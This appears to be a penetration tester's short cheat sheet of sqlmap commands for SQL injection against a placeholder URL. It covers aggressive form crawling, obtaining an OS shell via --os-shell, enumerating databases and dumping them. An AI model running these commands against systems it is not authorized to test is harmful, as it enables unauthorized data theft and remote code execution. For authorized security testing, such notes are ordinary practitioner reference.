# Crawl the web page and test all forms (Requires a lot of user interaction)
``` sqlmap -u $url --crawl --forms --level 5 --risk 3 ```

# Enter sqlmap interactive shell

```sqlmap --shell```

# Test for write privileges and get a shell

``` sqlmap -u $url --os-shell```

# Enumerate databases

```sqlmap -u $url --dbs```

# Dump databases

```sqlmap -u $url --dump```

## Most often I use something like:

```sqlmap -u $url --dump --crawl --forms --level 5 --risk 3```
